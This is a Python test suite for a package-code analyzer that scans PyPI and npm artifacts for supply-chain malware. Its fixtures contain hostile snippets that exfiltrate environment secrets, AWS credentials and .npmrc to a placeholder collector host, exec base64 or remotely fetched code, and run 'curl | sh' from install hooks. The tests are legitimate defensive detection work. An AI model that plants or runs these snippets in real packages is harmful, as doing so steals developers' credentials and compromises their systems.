from __future__ import annotations

import json
from pathlib import Path

import pytest

from ca9.analyzers.package_code import (
    MAX_TEXT_BYTES,
    _dedupe_findings,
    analyze_package_snapshots,
)
from ca9.artifacts.model import ArtifactFile, ArtifactSnapshot
from ca9.core.models import Artifact, Finding, Package

DISTUTILS_PRECEDENCE = (
    "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; "
    "enabled = os.environ.get(var, 'local') == 'local'; "
    "enabled and __import__('_distutils_hack').add_shim(); \n"
)
NSPKG = (
    "import sys, types, os;has_mfs = sys.version_info > (3, 5);"
    "p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('google',));"
    "importlib = has_mfs and __import__('importlib.util');"
    "has_mfs and __import__('importlib.machinery');"
    "m = has_mfs and sys.modules.setdefault('google', importlib.util.module_from_spec("
    "importlib.machinery.PathFinder.find_spec('google', [os.path.dirname(p)])));"
    "m = m or sys.modules.setdefault('google', types.ModuleType('google'));"
    "mp = (m or []) and m.__dict__.setdefault('__path__',[]);"
    "(p not in mp) and mp.append(p)\n"
)


def _snapshot(tmp_path: Path, files: dict[str, str | bytes], *, ecosystem: str = "pypi"):
    root = tmp_path / "extract"
    artifact_files = []
    for relative_path, content in files.items():
        path = root / relative_path
        path.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, str):
            path.write_text(content)
        else:
            path.write_bytes(content)
        artifact_files.append(ArtifactFile(relative_path, path, path.stat().st_size))
    kind = "npm-tarball" if ecosystem == "npm" else "wheel"
    package = Package(name="pkg", version="1.0.0", ecosystem=ecosystem, dependency_kind="direct")
    return ArtifactSnapshot(
        package=package,
        artifact=Artifact(kind=kind, url="https://example.invalid/pkg", hash="sha256:00"),
        archive_path=tmp_path / "pkg.archive",
        extract_dir=root,
        files=tuple(artifact_files),
    )


def _signals(tmp_path: Path, files: dict[str, str | bytes], **kwargs) -> dict[str, str]:
    findings = analyze_package_snapshots((_snapshot(tmp_path, files, **kwargs),))
    return {finding.signal_type: finding.metadata["action"] for finding in findings}


@pytest.mark.parametrize(
    ("name", "content"),
    [
        ("distutils-precedence.pth", DISTUTILS_PRECEDENCE),
        (
            "__editable__.pkg-1.0.pth",
            "import __editable___pkg_1_0_finder; __editable___pkg_1_0_finder.install()\n",
        ),
        ("_virtualenv.pth", "import _virtualenv\n"),
        ("google_api-1.0-nspkg.pth", NSPKG),
        ("pywin32.pth", "# comment\nwin32\nwin32\\lib\nimport pywin32_bootstrap\n"),
        ("paths.pth", "/opt/lib/python\n../vendor\n"),
    ],
)
def test_packaging_tool_pth_shapes_are_not_findings(tmp_path, name, content):
    assert _signals(tmp_path, {name: content}) == {}


def test_unrecognized_pth_import_is_investigated_not_blocked(tmp_path):
    signals = _signals(tmp_path, {"startup.pth": "import pkg_startup_hook\n"})

    assert signals == {"python-startup-pth-import": "investigate"}


@pytest.mark.parametrize(
    "content",
    [
        "import base64; exec(base64.b64decode('cHJpbnQoMSk='))\n",
        "import urllib.request as u; exec(u.urlopen('https://example.invalid/p').read())\n",
        "import socket; socket.create_connection(('example.invalid', 4444))\n",
        "import os; print(open(os.path.expanduser('~/.aws/credentials')).read())\n",
        "import os; exec(os.environ.get('PAYLOAD'))\n",
        "import os; exec('import subprocess; subprocess.run([\"id\"])')\n",
    ],
)
def test_suspicious_pth_lines_are_critical(tmp_path, content):
    signals = _signals(tmp_path, {"evil.pth": content})

    assert signals.get("python-startup-pth-exec") == "block"


def test_setup_py_version_exec_is_not_blocked(tmp_path):
    setup = (
        "from setuptools import setup\n"
        "about = {}\n"
        "exec(open('pkg/__about__.py').read(), about)\n"
        "setup(name='pkg', version=about['__version__'])\n"
    )

    assert _signals(tmp_path, {"pkg-1.0/setup.py": setup}) == {}


def test_setup_py_literal_exec_of_process_code_is_blocked(tmp_path):
    setup = "exec('import os; os.system(\"curl https://example.invalid | sh\")')\n"

    assert _signals(tmp_path, {"pkg-1.0/setup.py": setup})["setup-install-exec"] == "block"


def test_regex_compile_near_base64_is_not_encoded_execution(tmp_path):
    source = (
        "import base64, re\n"
        "def decode(value):\n"
        "    raw = base64.b64decode(value)\n"
        "    pattern = re.compile(rb'^[\\x00-\\x7f]+$')\n"
        "    return raw if pattern.match(raw) else b''\n"
    )

    assert _signals(tmp_path, {"pkg/codec.py": source}) == {}


@pytest.mark.parametrize(
    "source",
    [
        # Decoder nested inside exec, below try/def.
        "import base64\ndef run():\n    try:\n        exec(base64.b64decode('cHJpbnQoMSk='))\n"
        "    except Exception:\n        pass\n",
        # Exec textually before the decoder, through a name.
        "import zlib as z\ndef load(blob):\n    code = z.decompress(blob)\n    return eval(code)\n",
        # Builtin name built at runtime.
        "def run(p):\n    getattr(__builtins__, 'ex' + 'ec')(p)\n",
        "import builtins\nf = getattr(builtins, ''.join(['ev', 'al']))\n",
        "def run(p):\n    globals()['__builtins__']['ex' 'ec'](p)\n",
    ],
)
def test_python_encoded_execution_is_detected_at_any_nesting(tmp_path, source):
    signals = _signals(tmp_path, {"pkg/loader.py": source})

    assert signals.get("encoded-execution") == "block"


def test_encoded_execution_points_at_the_decoder(tmp_path):
    source = (
        "import base64\nimport os\npayload = base64.b64decode('cHJpbnQoMSk=')\n\nexec(payload)\n"
    )
    finding = next(
        item
        for item in analyze_package_snapshots((_snapshot(tmp_path, {"pkg/x.py": source}),))
        if item.signal_type == "encoded-execution"
    )

    assert finding.metadata["line"] == 3


@pytest.mark.parametrize(
    "source",
    [
        "__import__('os').system('id')\n",
        "import subprocess as sp\nsp.Popen(['sh', '-c', 'id'])\n",
        "from subprocess import check_output as co\ntry:\n    co(['id'])\nexcept OSError:\n    pass\n",
        "import os\nif os.name == 'posix':\n    os.system('id')\n",
        "import urllib.request\nclass Beacon:\n    data = urllib.request.urlopen('https://example.invalid').read()\n",
    ],
)
def test_import_time_behavior_resolves_aliases_and_compound_statements(tmp_path, source):
    signals = _signals(tmp_path, {"pkg/__init__.py": source})

    assert signals.get("import-time-risky-behavior") == "block"


def test_main_guard_and_function_bodies_are_not_import_time(tmp_path):
    source = (
        "import subprocess as sp\n"
        "def run():\n    return sp.check_output(['git', 'status'])\n"
        "if sys.platform != 'win32' and __name__ == '__main__':\n    sp.run(['git', 'status'])\n"
    )
    signals = _signals(tmp_path, {"pkg/cli.py": source})

    assert signals == {"silent-process-execution": "investigate"}


def test_module_level_http_clients_are_not_import_time_network(tmp_path):
    source = (
        "import requests\n"
        "from urllib.request import build_opener\n"
        "session = requests.Session()\n"
        "opener = build_opener()\n"
    )

    assert _signals(tmp_path, {"pkg/http.py": source}) == {}


def test_six_style_exec_of_literal_code_is_not_flagged(tmp_path):
    source = (
        "import types\n"
        "class _Moves(types.ModuleType):\n    pass\n"
        "moves = _Moves('six.moves')\n"
        "exec_ = getattr(moves.builtins, 'exec')\n"
        "exec_('def reraise(tp, value, tb=None):\\n    raise value\\n')\n"
    )

    assert _signals(tmp_path, {"six.py": source}) == {}


def test_sdk_credential_config_with_network_is_not_exfiltration(tmp_path):
    source = (
        "import os, requests\n"
        "api_key = os.environ.get('ACME_API_KEY')\n"
        "access_token = os.getenv('ACME_ACCESS_TOKEN')\n"
        "def fetch(path):\n"
        "    headers = {'Authorization': f'Bearer {api_key}'}\n"
        "    return requests.get('https://api.acme.example' + path, headers=headers)\n"
        "def run(cmd):\n"
        "    env = os.environ.copy()\n"
        "    env['ACME'] = '1'\n"
        "    return requests.post('https://api.acme.example/run', json={'cmd': cmd}) or env\n"
    )

    assert _signals(tmp_path, {"acme/client.py": source}) == {}


@pytest.mark.parametrize(
    "source",
    [
        "import os, requests\n"
        "secrets = {k: v for k, v in os.environ.items() if 'TOKEN' in k or 'SECRET' in k}\n"
        "requests.post('https://collector.example', json=secrets)\n",
        "import os, urllib.request\n"
        "creds = open(os.path.join(os.path.expanduser('~'), '.aws', 'credentials')).read()\n"
        "urllib.request.urlopen('https://collector.example', data=creds.encode())\n",
        "import os, json, requests\n"
        "env = dict(os.environ)\n"
        "requests.put('https://collector.example', data=json.dumps(env))\n",
        "import os, subprocess\n"
        "blob = str(os.environ)\n"
        "subprocess.run(['curl', '-d', blob, 'https://collector.example'])\n",
    ],
)
def test_credential_harvesting_with_network_is_blocked(tmp_path, source):
    signals = _signals(tmp_path, {"pkg/telemetry.py": source})

    assert signals.get("credential-network-exfiltration") == "block"


def test_npm_sdk_env_key_with_fetch_is_not_exfiltration(tmp_path):
    source = (
        "const key = process.env.STRIPE_API_KEY;\n"
        "module.exports = () => fetch('https://api.stripe.example', {headers: {key}});\n"
    )

    assert _signals(tmp_path, {"package/index.js": source}, ecosystem="npm") == {}


@pytest.mark.parametrize(
    "source",
    [
        "fetch('https://collector.example', {method: 'POST', body: JSON.stringify(process.env)});\n",
        "const t = Object.entries(process.env).filter(([k]) => /token|secret/i.test(k));\n"
        "require('https').request('https://collector.example').end(JSON.stringify(t));\n",
        "const fs = require('fs');\n"
        "const npmrc = fs.readFileSync(require('os').homedir() + '/.npmrc', 'utf8');\n"
        "fetch('https://collector.example', {method: 'POST', body: npmrc});\n",
    ],
)
def test_npm_credential_harvesting_is_blocked(tmp_path, source):
    signals = _signals(tmp_path, {"package/index.js": source}, ecosystem="npm")

    assert signals.get("npm-credential-exfiltration") == "block"


@pytest.mark.parametrize(
    "source",
    [
        "eval(Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString());\n",
        "new Function(atob('Y29uc29sZS5sb2coMSk='))();\n",
        "eval(String.fromCharCode(97, 108, 101, 114, 116));\n",
    ],
)
def test_npm_sink_wrapping_decoder_is_encoded_execution(tmp_path, source):
    signals = _signals(tmp_path, {"package/index.js": source}, ecosystem="npm")

    assert signals.get("npm-encoded-execution") == "block"


def test_regexp_exec_after_base64_decode_is_not_encoded_execution(tmp_path):
    source = (
        "const raw = Buffer.from(input, 'base64').toString();\n"
        "const match = /^data:(.*)$/.exec(raw);\n"
    )

    assert _signals(tmp_path, {"package/index.js": source}, ecosystem="npm") == {}


@pytest.mark.parametrize(
    "source",
    [
        "require('child' + '_process').exec('id');\n",
        "const cp = require(['child', 'process'].join('_'));\n",
        "const cp = require('\\x63hild_process');\n",
        "import('no' + 'de:' + 'net').then((net) => net.connect(4444));\n",
    ],
)
def test_npm_obfuscated_require_is_blocked(tmp_path, source):
    signals = _signals(tmp_path, {"package/index.js": source}, ecosystem="npm")

    assert signals.get("npm-obfuscated-require") == "block"


def test_npm_plain_and_dynamic_path_requires_are_not_obfuscated(tmp_path):
    source = (
        "const cp = require('child_process');\n"
        "const local = require('./lib/' + name);\n"
        "const mod = require(path.join(__dirname, 'x'));\n"
    )

    signals = _signals(tmp_path, {"package/index.js": source}, ecosystem="npm")

    assert "npm-obfuscated-require" not in signals


def test_oversized_code_is_reported_and_its_suffix_scanned(tmp_path):
    padding = "// bundle\n" * (MAX_TEXT_BYTES // 10 + 1024)
    payload = "fetch('https://collector.example', {body: JSON.stringify(process.env)});\n"
    signals = _signals(
        tmp_path,
        {"package/bun_environment.js": padding + payload},
        ecosystem="npm",
    )

    assert signals["package-file-uninspected"] == "investigate"
    assert signals["npm-credential-exfiltration"] == "block"


def test_npm_native_binaries_are_investigated_once(tmp_path):
    findings = analyze_package_snapshots(
        (
            _snapshot(
                tmp_path,
                {
                    "package/prebuilds/linux-x64/addon.node": b"\x7fELF\x02\x01\x01\x00",
                    "package/bin/tool": b"\xcf\xfa\xed\xfe\x07\x00\x00\x01",
                    "package/index.js": "module.exports = 1;\n",
                },
                ecosystem="npm",
            ),
        )
    )

    assert [finding.signal_type for finding in findings] == ["npm-native-binary"]
    assert findings[0].metadata["action"] == "investigate"
    assert findings[0].metadata["binary_count"] == 2


def test_python_wheels_with_extension_modules_are_not_flagged(tmp_path):
    assert _signals(tmp_path, {"pkg/_speedups.so": b"\x7fELF\x02\x01\x01\x00"}) == {}


def test_install_hook_running_bundled_runtime_installer_ranks_high(tmp_path):
    manifest = json.dumps(
        {"name": "pkg", "version": "1.0.0", "scripts": {"preinstall": "node setup_bun.js"}}
    )
    setup_bun = (
        "const { execSync } = require('child_process');\n"
        "execSync('curl -fsSL https://bun.sh/install | bash', { stdio: 'ignore' });\n"
        "execSync('bun run bun_environment.js');\n"
    )
    findings = analyze_package_snapshots(
        (
            _snapshot(
                tmp_path,
                {"package/package.json": manifest, "package/setup_bun.js": setup_bun},
                ecosystem="npm",
            ),
        )
    )
    downloader = next(
        finding for finding in findings if finding.signal_type == "npm-install-script-downloader"
    )

    assert downloader.severity == "high"
    assert downloader.metadata["file_path"] == "package/setup_bun.js"
    assert downloader.metadata["runtime_install"] is True
    assert {finding.signal_type for finding in findings} >= {"npm-install-script"}


def test_install_hook_running_plain_build_script_stays_medium(tmp_path):
    manifest = json.dumps(
        {"name": "pkg", "version": "1.0.0", "scripts": {"postinstall": "node scripts/build.js"}}
    )
    signals = _signals(
        tmp_path,
        {
            "package/package.json": manifest,
            "package/scripts/build.js": "require('fs').writeFileSync('out.txt', 'ok');\n",
        },
        ecosystem="npm",
    )

    assert signals == {"npm-install-script": "investigate"}


def test_findings_sort_by_severity_rank():
    findings = [
        Finding(title=severity, signal_type="x", package_key=f"npm:{severity}", severity=severity)
        for severity in ("low", "medium", "critical", "high")
    ]

    assert [finding.severity for finding in _dedupe_findings(findings)] == [
        "critical",
        "high",
        "medium",
        "low",
    ]
